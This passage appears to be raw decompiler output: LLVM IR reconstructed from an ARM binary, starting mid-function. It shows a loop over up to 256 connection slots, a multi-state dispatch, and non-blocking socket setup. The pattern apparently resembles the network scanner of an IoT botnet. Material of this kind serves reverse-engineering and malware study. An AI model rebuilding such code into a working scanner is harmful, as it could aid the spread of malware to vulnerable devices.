  store i1 %v7_82ec, i1* %cpsr_z.global-to-local, align 1
  %v7_82f0 = icmp sgt i32 %v2_82e8, 9
  br i1 %v7_82f0, label %dec_label_pc_82b4, label %bb158

bb158:                                            ; preds = %dec_label_pc_82e4
  %v10_82f0 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v8_82f4 = load i32, i32* @r4, align 4
  %v10_82f4 = add i32 %v10_82f0, 356
  %v11_82f4 = inttoptr i32 %v10_82f4 to i32*
  store i32 %v8_82f4, i32* %v11_82f4, align 4
  br label %dec_label_pc_82fc

dec_label_pc_82fc:                                ; preds = %bb158, %bb162
  %v0_82fc = load i32, i32* @sl, align 4
  store i32 %v0_82fc, i32* %r0.global-to-local, align 4
  %v1_8300 = inttoptr i32 %v0_82fc to i8*
  %v2_8300 = call i32 @function_12370(i8* %v1_8300)
  store i32 %v2_8300, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_8308 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8308, i32* %ip.global-to-local, align 4
  %v3_830c = icmp uge i32 %v2_8300, %v3_8308
  store i1 %v3_830c, i1* %cpsr_c.global-to-local, align 1
  %v9_830c = icmp eq i32 %v2_8300, %v3_8308
  store i1 %v9_830c, i1* %cpsr_z.global-to-local, align 1
  %v7_8310 = icmp sgt i32 %v2_8300, %v3_8308
  br i1 %v7_8310, label %dec_label_pc_8314, label %dec_label_pc_8340

dec_label_pc_8314:                                ; preds = %dec_label_pc_82fc
  %v0_8314 = load i32, i32* @sl, align 4
  %v2_8314 = add i32 %v0_8314, %v3_8308
  %v3_8314 = inttoptr i32 %v2_8314 to i8*
  %v4_8314 = load i8, i8* %v3_8314, align 1
  %v6_8314 = zext i8 %v4_8314 to i32
  %v1_8318 = add nsw i32 %v6_8314, -32
  store i32 %v1_8318, i32* %r2.global-to-local, align 4
  %v1_831c = add nsw i32 %v6_8314, -97
  store i32 %v1_831c, i32* %r3.global-to-local, align 4
  %v2_8320 = icmp ugt i32 %v1_831c, 24
  store i1 %v2_8320, i1* %cpsr_c.global-to-local, align 1
  %v7_8320 = icmp eq i32 %v1_831c, 25
  store i1 %v7_8320, i1* %cpsr_z.global-to-local, align 1
  %v2_8324 = xor i1 %v2_8320, true
  %v3_8324 = or i1 %v7_8320, %v2_8324
  br i1 %v3_8324, label %bb159, label %bb160

bb159:                                            ; preds = %dec_label_pc_8314
  %v5_8324 = trunc i32 %v1_8318 to i8
  store i8 %v5_8324, i8* %v3_8314, align 1
  %v0_8328.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_8328.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb160

bb160:                                            ; preds = %dec_label_pc_8314, %bb159
  %v1_832c = phi i1 [ %v2_8320, %dec_label_pc_8314 ], [ %v1_8328.pre, %bb159 ]
  %v0_832c = phi i1 [ false, %dec_label_pc_8314 ], [ %v0_8328.pre, %bb159 ]
  %v2_8328 = xor i1 %v1_832c, true
  %v3_8328 = or i1 %v0_832c, %v2_8328
  br i1 %v3_8328, label %bb161, label %._crit_edge

._crit_edge:                                      ; preds = %bb160
  %v0_8334.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb162

bb161:                                            ; preds = %bb160
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v7_832c = load i32, i32* %v11_82f4, align 4
  store i32 %v7_832c, i32* %ip.global-to-local, align 4
  br label %bb162

bb162:                                            ; preds = %._crit_edge, %bb161
  %v0_8334 = phi i32 [ %v0_8334.pre, %._crit_edge ], [ %v7_832c, %bb161 ]
  store i32 %v10_82f0, i32* @lr, align 4
  %v1_8334 = add i32 %v0_8334, 1
  store i32 %v1_8334, i32* %ip.global-to-local, align 4
  store i32 %v1_8334, i32* %stack_var_-44, align 4
  br label %dec_label_pc_82fc

dec_label_pc_8340:                                ; preds = %dec_label_pc_82fc
  store i32 36, i32* %r0.global-to-local, align 4
  %v1_8344 = call i32 @function_11ad8(i32 36)
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_834c = call i32 @function_11ad8(i32 37)
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_8354 = call i32 @function_11ad8(i32 38)
  store i32 39, i32* %r0.global-to-local, align 4
  %v1_835c = call i32 @function_11ad8(i32 39)
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_8364 = call i32 @function_11ad8(i32 40)
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_836c = call i32 @function_11ad8(i32 41)
  store i32 42, i32* %r0.global-to-local, align 4
  %v1_8374 = call i32 @function_11ad8(i32 42)
  store i32 43, i32* %r0.global-to-local, align 4
  %v1_837c = call i32 @function_11ad8(i32 43)
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_8384 = call i32 @function_11ad8(i32 44)
  store i32 45, i32* %r0.global-to-local, align 4
  %v1_838c = call i32 @function_11ad8(i32 45)
  store i32 %v1_838c, i32* %r0.global-to-local, align 4
  %v0_8390 = load i32, i32* @r6, align 4
  %v3_8390 = icmp ugt i32 %v0_8390, 255
  store i1 %v3_8390, i1* %cpsr_c.global-to-local, align 1
  %v8_8390 = icmp eq i32 %v0_8390, 256
  store i1 %v8_8390, i1* %cpsr_z.global-to-local, align 1
  %v5_8394 = icmp slt i32 %v0_8390, 256
  br i1 %v5_8394, label %thread-pre-split, label %bb163

bb163:                                            ; preds = %dec_label_pc_8340
  store i32 256, i32* @r6, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_8340, %bb163
  %v0_839c = phi i32 [ 256, %bb163 ], [ %v0_8390, %dec_label_pc_8340 ]
  store i32 46, i32* %r0.global-to-local, align 4
  %v1_83a0 = call i32 @function_11ad8(i32 46)
  store i32 %v0_839c, i32* %r0.global-to-local, align 4
  store i32 3140, i32* %r1.global-to-local, align 4
  %v2_83b0 = call i32 @function_13258(i32 %v0_839c, i32 3140)
  store i32 %v2_83b0, i32* %r0.global-to-local, align 4
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_83b8 = icmp eq i32 %v0_839c, 0
  store i1 %v2_83b8, i1* %cpsr_z.global-to-local, align 1
  %tmp164 = icmp slt i32 %v0_839c, 1
  br i1 %tmp164, label %dec_label_pc_84d4, label %dec_label_pc_83c4

dec_label_pc_83c4:                                ; preds = %thread-pre-split
  store i32 %v2_83b0, i32* @r5, align 4
  store i32 0, i32* @sb, align 4
  %v2_83f0 = and i32 %arg1, 536870912
  %v3_83f0 = icmp ne i32 %v2_83f0, 0
  %v5_83f0 = mul i32 %arg1, 24
  %v2_83f4 = add i32 %v5_83f0, %arg2
  %v1_83f8 = add i32 %v2_83f4, 16
  %v2_83f8 = inttoptr i32 %v1_83f8 to i32*
  br label %dec_label_pc_83cc

dec_label_pc_83cc:                                ; preds = %dec_label_pc_9df8, %dec_label_pc_83c4
  %v1_83d8 = phi i32 [ %v1_9e14, %dec_label_pc_9df8 ], [ %v2_83b0, %dec_label_pc_83c4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_83d8 = inttoptr i32 %v1_83d8 to i32*
  store i32 -1, i32* %v2_83d8, align 4
  %v0_83dc = load i32, i32* %r3.global-to-local, align 4
  %v1_83dc = trunc i32 %v0_83dc to i8
  %v2_83dc = load i32, i32* @r5, align 4
  %v3_83dc = add i32 %v2_83dc, 4
  %v4_83dc = inttoptr i32 %v3_83dc to i8*
  store i8 %v1_83dc, i8* %v4_83dc, align 1
  %v0_83e0 = load i32, i32* @sb, align 4
  store i32 %v0_83e0, i32* %r0.global-to-local, align 4
  %v2_83e4 = call i32 @function_12bac(i32 %v0_83e0, i32 %arg1)
  store i32 %v2_83e4, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  store i1 %v3_83f0, i1* %cpsr_c.global-to-local, align 1
  store i32 %v5_83f0, i32* %r3.global-to-local, align 4
  store i32 %v2_83f4, i32* @r6, align 4
  %v3_83f8 = load i32, i32* %v2_83f8, align 4
  store i32 %v3_83f8, i32* %r2.global-to-local, align 4
  %v0_83fc = load i32, i32* @r5, align 4
  %v1_83fc = add i32 %v0_83fc, 532
  store i32 %v1_83fc, i32* @fp, align 4
  store i32 %v1_83fc, i32* @r0, align 4
  %v0_8404 = load i32, i32* @r7, align 4
  store i32 %v0_8404, i32* %r1.global-to-local, align 4
  %v2_8408 = add i32 %v0_83fc, 16
  %v3_8408 = inttoptr i32 %v2_8408 to i32*
  store i32 %v3_83f8, i32* %v3_8408, align 4
  %v2_840c = inttoptr i32 %v1_83fc to i8*
  %v3_840c = call i32 @function_12398(i8* %v2_840c, i32 %v0_8404)
  store i32 %v3_840c, i32* %r0.global-to-local, align 4
  %v0_8410 = load i32, i32* @r5, align 4
  %v1_8410 = add i32 %v0_8410, 532
  %v2_8410 = inttoptr i32 %v1_8410 to i8*
  %v3_8410 = load i8, i8* %v2_8410, align 1
  %v4_8410 = zext i8 %v3_8410 to i32
  store i32 %v4_8410, i32* %r3.global-to-local, align 4
  %v2_8414 = icmp ugt i8 %v3_8410, 46
  store i1 %v2_8414, i1* %cpsr_c.global-to-local, align 1
  %v7_8414 = icmp eq i8 %v3_8410, 47
  store i1 %v7_8414, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8414, label %dec_label_pc_8440, label %dec_label_pc_841c

dec_label_pc_841c:                                ; preds = %dec_label_pc_83cc
  %v0_841c = load i32, i32* @fp, align 4
  store i32 %v0_841c, i32* %r0.global-to-local, align 4
  %v1_8420 = inttoptr i32 %v0_841c to i8*
  %v2_8420 = call i32 @function_12370(i8* %v1_8420)
  store i32 %v2_8420, i32* %r2.global-to-local, align 4
  %v0_8428 = load i32, i32* @r5, align 4
  %v1_842c = add i32 %v0_8428, 533
  store i32 %v1_842c, i32* %r0.global-to-local, align 4
  %v0_8430 = load i32, i32* @fp, align 4
  store i32 %v0_8430, i32* %r1.global-to-local, align 4
  %v3_8434 = inttoptr i32 %v1_842c to i8*
  %v4_8434 = call i32 @function_15448(i8* %v3_8434, i32 %v0_8430, i32 %v2_8420)
  store i32 %v4_8434, i32* %r0.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_843c = load i32, i32* @r5, align 4
  %v3_843c = add i32 %v2_843c, 532
  %v4_843c = inttoptr i32 %v3_843c to i8*
  store i8 47, i8* %v4_843c, align 1
  %v0_8444.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_8440

dec_label_pc_8440:                                ; preds = %dec_label_pc_83cc, %dec_label_pc_841c
  %v0_8444 = phi i32 [ %v0_8410, %dec_label_pc_83cc ], [ %v0_8444.pre, %dec_label_pc_841c ]
  %v0_8440 = load i32, i32* @sl, align 4
  store i32 %v0_8440, i32* %r1.global-to-local, align 4
  %v1_8444 = add i32 %v0_8444, 1440
  store i32 %v1_8444, i32* @r0, align 4
  %v2_8448 = inttoptr i32 %v1_8444 to i8*
  %v3_8448 = call i32 @function_12398(i8* %v2_8448, i32 %v0_8440)
  %v0_844c = load i32, i32* @r5, align 4
  %v0_8450 = load i32, i32* @sl, align 4
  store i32 %v0_8450, i32* %r1.global-to-local, align 4
  %v1_8454 = add i32 %v0_844c, 1431
  store i32 %v1_8454, i32* @r0, align 4
  %v2_8458 = inttoptr i32 %v1_8454 to i8*
  %v3_8458 = call i32 @function_12398(i8* %v2_8458, i32 %v0_8450)
  %v0_845c = load i32, i32* @r5, align 4
  %v1_8460 = add i32 %v0_845c, 789
  store i32 %v1_8460, i32* @r0, align 4
  %v0_8464 = load i32, i32* @r8, align 4
  store i32 %v0_8464, i32* %r1.global-to-local, align 4
  %v2_8468 = inttoptr i32 %v1_8460 to i8*
  %v3_8468 = call i32 @function_12398(i8* %v2_8468, i32 %v0_8464)
  store i32 %v3_8468, i32* %r0.global-to-local, align 4
  %v0_846c = load i32, i32* @r6, align 4
  %v1_846c = add i32 %v0_846c, 20
  %v2_846c = inttoptr i32 %v1_846c to i8*
  %v3_846c = load i8, i8* %v2_846c, align 1
  %v4_846c = zext i8 %v3_846c to i32
  store i32 %v4_846c, i32* %r3.global-to-local, align 4
  %v2_8470 = icmp ugt i8 %v3_846c, 30
  store i1 %v2_8470, i1* %cpsr_c.global-to-local, align 1
  %v7_8470 = icmp eq i8 %v3_846c, 31
  store i1 %v7_8470, i1* %cpsr_z.global-to-local, align 1
  %v2_8474 = xor i1 %v7_8470, true
  %v3_8474 = and i1 %v2_8470, %v2_8474
  br i1 %v3_8474, label %dec_label_pc_8498, label %dec_label_pc_8478

dec_label_pc_8478:                                ; preds = %dec_label_pc_8440
  %v1_8478 = add i32 %v0_846c, 16
  %v2_8478 = inttoptr i32 %v1_8478 to i32*
  %v3_8478 = load i32, i32* %v2_8478, align 4
  store i32 %v3_8478, i32* %r0.global-to-local, align 4
  %v1_847c = call i32 @function_14a1c(i32 %v3_8478)
  store i32 %v1_847c, i32* %r0.global-to-local, align 4
  store i32 %v1_847c, i32* @r4, align 4
  %v0_8484 = call i32 @function_f570()
  store i32 %v0_8484, i32* %r0.global-to-local, align 4
  %v0_8488 = load i32, i32* @r6, align 4
  %v1_8488 = add i32 %v0_8488, 20
  %v2_8488 = inttoptr i32 %v1_8488 to i8*
  %v3_8488 = load i8, i8* %v2_8488, align 1
  %v4_8488 = zext i8 %v3_8488 to i32
  store i32 %v4_8488, i32* %r3.global-to-local, align 4
  %v0_848c = load i32, i32* @r4, align 4
  %v3_848c = add nsw i32 %v4_8488, -1
  %v4_848c = shl i32 1, %v3_848c
  %v5_848c = and i32 %v4_848c, %v0_8484
  %v6_848c = icmp ne i32 %v5_848c, 0
  store i1 %v6_848c, i1* %cpsr_c.global-to-local, align 1
  %v7_848c = lshr i32 %v0_8484, %v4_8488
  %v8_848c = add i32 %v7_848c, %v0_848c
  store i32 %v8_848c, i32* %r0.global-to-local, align 4
  %v1_8490 = call i32 @function_14874(i32 %v8_848c)
  store i32 %v1_8490, i32* %r0.global-to-local, align 4
  %v1_8494 = load i32, i32* @r5, align 4
  %v2_8494 = add i32 %v1_8494, 16
  %v3_8494 = inttoptr i32 %v2_8494 to i32*
  store i32 %v1_8490, i32* %v3_8494, align 4
  br label %dec_label_pc_8498

dec_label_pc_8498:                                ; preds = %dec_label_pc_8440, %dec_label_pc_8478
  %v0_8498 = call i32 @function_f570()
  %v3_84a4 = udiv i32 %v0_8498, 5
  store i32 %v3_84a4, i32* %r2.global-to-local, align 4
  store i32 %v3_84a4, i32* %r3.global-to-local, align 4
  %v2_84b0 = sub i32 %v0_8498, %v3_84a4
  store i32 %v2_84b0, i32* %r0.global-to-local, align 4
  %v7_84b4 = icmp eq i32 %v2_84b0, 4
  store i1 %v7_84b4, i1* %cpsr_z.global-to-local, align 1
  %v5_84b8 = and i32 %v2_84b0, 1073741824
  %v6_84b8 = icmp ne i32 %v5_84b8, 0
  store i1 %v6_84b8, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v2_84b0, label %dec_label_pc_9df8 [
    i32 0, label %dec_label_pc_9eac
    i32 1, label %dec_label_pc_9e80
    i32 2, label %dec_label_pc_9ed8
    i32 3, label %dec_label_pc_9dd0
    i32 4, label %dec_label_pc_9e40
  ]

dec_label_pc_84d4:                                ; preds = %thread-pre-split
  %v1_84e4 = add i32 %v2_83b0, 1452
  store i32 %v1_84e4, i32* %ip.global-to-local, align 4
  %v2_84e8 = ptrtoint i32* %stack_var_-10572 to i32
  store i32 %v2_84e8, i32* @lr, align 4
  br label %dec_label_pc_84f4.preheader

dec_label_pc_84f4.preheader:                      ; preds = %dec_label_pc_84d4, %dec_label_pc_9e1c
  %stack_var_-20860.0.ph = phi i32 [ %v2_9e30, %dec_label_pc_9e1c ], [ %v2_84e8, %dec_label_pc_84d4 ]
  %stack_var_-20868.0.ph = phi i32 [ %v1_9e2c, %dec_label_pc_9e1c ], [ %v1_84e4, %dec_label_pc_84d4 ]
  %v2_865c = ptrtoint i32* %stack_var_-144 to i32
  %v2_8674 = ptrtoint i32* %stack_var_-44 to i32
  %v2_86bc = ptrtoint i32* %stack_var_-76 to i32
  %v2_86d8 = ptrtoint i32* %stack_var_-40 to i32
  %v1_88b8 = inttoptr i32 %stack_var_-20860.0.ph to i8*
  %v2_8c14 = icmp eq i32 %v6_81f8, 0
  %v1_8b10 = inttoptr i32 %v6_81f8 to i8*
  %v2_8740 = ptrtoint i32* %stack_var_-60 to i32
  %v2_8744 = ptrtoint i32* %stack_var_-204 to i32
  %v2_8748 = ptrtoint i32* %stack_var_-332 to i32
  %v2_8828 = ptrtoint i32* %stack_var_-48 to i32
  %v2_8834 = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_84f4

dec_label_pc_84f4:                                ; preds = %dec_label_pc_8720, %dec_label_pc_8554, %dec_label_pc_8718, %dec_label_pc_87b4, %dec_label_pc_84f4.preheader
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_84f8 = call i32 @function_15b1c(i32* null)
  store i32 %v2_84f8, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 20680, i32* %ip.global-to-local, align 4
  %v2_8524213 = load i32, i32* @sp, align 4
  %v3_8524214 = add i32 %v2_8524213, 20680
  %v4_8524215 = inttoptr i32 %v3_8524214 to i32*
  store i32 0, i32* %v4_8524215, align 4
  br label %dec_label_pc_8510.dec_label_pc_8510_crit_edge

dec_label_pc_8510.dec_label_pc_8510_crit_edge:    ; preds = %dec_label_pc_84f4, %dec_label_pc_8510.dec_label_pc_8510_crit_edge
  %v0_8510.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_8514 = add i32 %v0_8510.pre, 4
  store i32 %v1_8514, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_851c = add i32 %v0_8510.pre, 20676
  store i32 %v1_851c, i32* %ip.global-to-local, align 4
  %v7_8520 = icmp eq i32 %v1_8514, 128
  %v2_8524 = load i32, i32* @sp, align 4
  %v3_8524 = add i32 %v2_8524, %v1_851c
  %v4_8524 = inttoptr i32 %v3_8524 to i32*
  store i32 0, i32* %v4_8524, align 4
  br i1 %v7_8520, label %dec_label_pc_852c, label %dec_label_pc_8510.dec_label_pc_8510_crit_edge

dec_label_pc_852c:                                ; preds = %dec_label_pc_8510.dec_label_pc_8510_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_82f0, i32* @lr, align 4
  %v0_8530 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_8530, i32* %stack_var_-332, align 4
  %v0_8534 = load i32, i32* %r3.global-to-local, align 4
  %v1_853c216 = add i32 %v0_8534, -120
  store i32 %v1_853c216, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_8544217 = add i32 %v0_8534, 20424
  store i32 %v1_8544217, i32* %r1.global-to-local, align 4
  %v7_8548218 = icmp eq i32 %v1_853c216, 128
  %v2_854c219 = load i32, i32* @sp, align 4
  %v3_854c220 = add i32 %v2_854c219, %v1_8544217
  %v4_854c221 = inttoptr i32 %v3_854c220 to i32*
  store i32 0, i32* %v4_854c221, align 4
  br i1 %v7_8548218, label %dec_label_pc_8554, label %dec_label_pc_8538.dec_label_pc_8538_crit_edge

dec_label_pc_8538.dec_label_pc_8538_crit_edge:    ; preds = %dec_label_pc_852c, %dec_label_pc_8538.dec_label_pc_8538_crit_edge
  %v0_8538.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_853c = add i32 %v0_8538.pre, 4
  store i32 %v1_853c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_8544 = add i32 %v0_8538.pre, 20548
  store i32 %v1_8544, i32* %r1.global-to-local, align 4
  %v7_8548 = icmp eq i32 %v1_853c, 128
  %v2_854c = load i32, i32* @sp, align 4
  %v3_854c = add i32 %v2_854c, %v1_8544
  %v4_854c = inttoptr i32 %v3_854c to i32*
  store i32 0, i32* %v4_854c, align 4
  br i1 %v7_8548, label %dec_label_pc_8554, label %dec_label_pc_8538.dec_label_pc_8538_crit_edge

dec_label_pc_8554:                                ; preds = %dec_label_pc_8538.dec_label_pc_8538_crit_edge, %dec_label_pc_852c
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  %v1_8558 = load i32, i32* %r0.global-to-local, align 4
  %v3_8558 = icmp uge i32 %v0_839c, %v1_8558
  store i1 %v3_8558, i1* %cpsr_c.global-to-local, align 1
  %v9_8558 = icmp eq i32 %v0_839c, %v1_8558
  store i1 %v9_8558, i1* %cpsr_z.global-to-local, align 1
  %v7_855c = icmp sgt i32 %v0_839c, %v1_8558
  br i1 %v7_855c, label %dec_label_pc_8560, label %dec_label_pc_84f4

dec_label_pc_8560:                                ; preds = %dec_label_pc_8554
  store i32 %stack_var_-20868.0.ph, i32* @sl, align 4
  store i32 %v1_8558, i32* @r8, align 4
  store i32 %stack_var_-20868.0.ph, i32* @r6, align 4
  store i32 %v1_8558, i32* @r7, align 4
  br label %dec_label_pc_85d4

dec_label_pc_8574:                                ; preds = %dec_label_pc_85e8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_8574 = icmp eq i8 %v3_85d4, 2
  store i1 %v7_8574, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8574, label %dec_label_pc_8cb4, label %dec_label_pc_857c

dec_label_pc_857c:                                ; preds = %dec_label_pc_8574
  %v2_857c = icmp ugt i8 %v3_85d4, 3
  store i1 %v2_857c, i1* %cpsr_c.global-to-local, align 1
  %v7_857c = icmp eq i8 %v3_85d4, 4
  store i1 %v7_857c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_857c, label %dec_label_pc_8884, label %dec_label_pc_8584

dec_label_pc_8584:                                ; preds = %dec_label_pc_857c
  %v1_8584 = add nsw i32 %v4_85d4, -6
  %v2_8584 = icmp ugt i8 %v3_85d4, 5
  store i1 %v2_8584, i1* %cpsr_c.global-to-local, align 1
  %v7_8584 = icmp eq i8 %v3_85d4, 6
  store i1 %v7_8584, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8584, label %dec_label_pc_8d4c, label %dec_label_pc_858c

dec_label_pc_858c:                                ; preds = %dec_label_pc_8584
  %v2_858c = icmp ugt i8 %v3_85d4, 6
  store i1 %v2_858c, i1* %cpsr_c.global-to-local, align 1
  %v7_858c = icmp eq i8 %v3_85d4, 7
  store i1 %v7_858c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_858c, label %dec_label_pc_8f84, label %dec_label_pc_8594

dec_label_pc_8594:                                ; preds = %dec_label_pc_858c
  %v2_8594 = icmp ugt i8 %v3_85d4, 9
  store i1 %v2_8594, i1* %cpsr_c.global-to-local, align 1
  %v7_8594 = icmp eq i8 %v3_85d4, 10
  store i1 %v7_8594, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8594, label %dec_label_pc_8fd8, label %dec_label_pc_859c

dec_label_pc_859c:                                ; preds = %dec_label_pc_8594
  %v1_859c = add nsw i32 %v4_85d4, -11
  %v2_859c = icmp ugt i8 %v3_85d4, 10
  store i1 %v2_859c, i1* %cpsr_c.global-to-local, align 1
  %v7_859c = icmp eq i8 %v3_85d4, 11
  store i1 %v7_859c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_859c, label %dec_label_pc_9574, label %dec_label_pc_85a4

dec_label_pc_85a4:                                ; preds = %dec_label_pc_8cb4, %dec_label_pc_859c
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v2_85d4, align 1
  %v0_85ac = load i32, i32* @r6, align 4
  %v1_85ac = add i32 %v0_85ac, -1452
  %v2_85ac = inttoptr i32 %v1_85ac to i32*
  %v3_85ac = load i32, i32* %v2_85ac, align 4
  store i32 %v3_85ac, i32* @r0, align 4
  %v1_85b0 = call i32 @function_15b6c(i32 %v3_85ac)
  store i32 %v1_85b0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_85b8 = load i32, i32* @r6, align 4
  %v2_85b8 = add i32 %v1_85b8, -1452
  %v3_85b8 = inttoptr i32 %v2_85b8 to i32*
  store i32 -1, i32* %v3_85b8, align 4
  br label %dec_label_pc_85bc

dec_label_pc_85bc:                                ; preds = %dec_label_pc_8d4c, %dec_label_pc_86e0, %dec_label_pc_85f0, %dec_label_pc_8fd8, %dec_label_pc_8f84, %dec_label_pc_9574, %bb168, %dec_label_pc_85a4
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  %v0_85c0 = load i32, i32* @r7, align 4
  %v1_85c0 = add i32 %v0_85c0, 1
  store i32 %v1_85c0, i32* @r7, align 4
  %v0_85c4 = load i32, i32* @r6, align 4
  %v3_85c8 = icmp uge i32 %v1_85c0, %v0_839c
  store i1 %v3_85c8, i1* %cpsr_c.global-to-local, align 1
  %v9_85c8 = icmp eq i32 %v1_85c0, %v0_839c
  store i1 %v9_85c8, i1* %cpsr_z.global-to-local, align 1
  %v1_85cc = add i32 %v0_85c4, 3140
  store i32 %v1_85cc, i32* @r6, align 4
  br i1 %v9_85c8, label %dec_label_pc_85bc.dec_label_pc_8718_crit_edge, label %dec_label_pc_85d4

dec_label_pc_85bc.dec_label_pc_8718_crit_edge:    ; preds = %dec_label_pc_85bc
  %v0_8718.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_8718

dec_label_pc_85d4:                                ; preds = %dec_label_pc_8700, %dec_label_pc_85bc, %dec_label_pc_8560
  %v3_8878 = phi i32 [ %stack_var_-20868.0.ph, %dec_label_pc_8560 ], [ %v1_85cc, %dec_label_pc_85bc ], [ %v1_8710, %dec_label_pc_8700 ]
  %v1_85d4 = add i32 %v3_8878, -1448
  %v2_85d4 = inttoptr i32 %v1_85d4 to i8*
  %v3_85d4 = load i8, i8* %v2_85d4, align 1
  %v4_85d4 = zext i8 %v3_85d4 to i32
  store i32 %v4_85d4, i32* %r3.global-to-local, align 4
  %v2_85dc = icmp ne i8 %v3_85d4, 0
  store i1 %v2_85dc, i1* %cpsr_c.global-to-local, align 1
  %v6_85dc = icmp eq i8 %v3_85d4, 0
  %v7_85dc = icmp eq i8 %v3_85d4, 1
  store i1 %v7_85dc, i1* %cpsr_z.global-to-local, align 1
  %v1_85e0 = add i32 %v3_8878, -1452
  store i32 %v1_85e0, i32* @r5, align 4
  br i1 %v7_85dc, label %dec_label_pc_886c, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %dec_label_pc_85d4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_85dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_85dc, label %dec_label_pc_85f0, label %dec_label_pc_8574

dec_label_pc_85f0:                                ; preds = %.thread18.dec_label_pc_85f0_crit_edge, %dec_label_pc_85e8
  %v0_85f0 = phi i32 [ %v0_85f0.pre, %.thread18.dec_label_pc_85f0_crit_edge ], [ %v3_8878, %dec_label_pc_85e8 ]
  %v1_85f0 = add i32 %v0_85f0, -1452
  %v2_85f0 = inttoptr i32 %v1_85f0 to i32*
  %v3_85f0 = load i32, i32* %v2_85f0, align 4
  store i32 %v3_85f0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v2_85fc = icmp eq i32 %v3_85f0, -1
  store i1 %v2_85fc, i1* %cpsr_c.global-to-local, align 1
  %v7_85fc = icmp eq i32 %v3_85f0, -1
  store i1 %v7_85fc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-76, align 4
  store i32 34324, i32* @lr, align 4
  %v1_8610 = xor i1 %v7_85fc, true
  call void @__pseudo_cond_branch(i1 %v1_8610, i32 ptrtoint (i32* @global_var_15b6c.24 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_861c = load i32, i32* @r5, align 4
  store i32 %v0_861c, i32* %r2.global-to-local, align 4
  %v3_8620 = call i32 @function_14ba0(i32 2, i32 1, i32 %v0_861c)
  store i32 %v3_8620, i32* %r0.global-to-local, align 4
  %v2_8624 = icmp eq i32 %v3_8620, -1
  store i1 %v2_8624, i1* %cpsr_c.global-to-local, align 1
  %v7_8624 = icmp eq i32 %v3_8620, -1
  store i1 %v7_8624, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_8620, i32* @r4, align 4
  %v1_862c = load i32, i32* @r6, align 4
  %v2_862c = add i32 %v1_862c, -1452
  %v3_862c = inttoptr i32 %v2_862c to i32*
  store i32 %v3_8620, i32* %v3_862c, align 4
  br i1 %v7_8624, label %dec_label_pc_85bc, label %dec_label_pc_8634

dec_label_pc_8634:                                ; preds = %dec_label_pc_85f0
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_8638 = load i32, i32* @r5, align 4
  store i32 %v0_8638, i32* %r2.global-to-local, align 4
  %v3_863c = call i32 @function_12fb4(i32 %v3_8620, i32 3, i32 %v0_8638)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_8644 = or i32 %v3_863c, 2048
  store i32 %v1_8644, i32* %r2.global-to-local, align 4
  %v0_8648 = load i32, i32* @r4, align 4
  store i32 %v0_8648, i32* %r0.global-to-local, align 4
  %v3_864c = call i32 @function_12fb4(i32 %v0_8648, i32 4, i32 %v1_8644)
  store i32 %v3_864c, i32* %r0.global-to-local, align 4
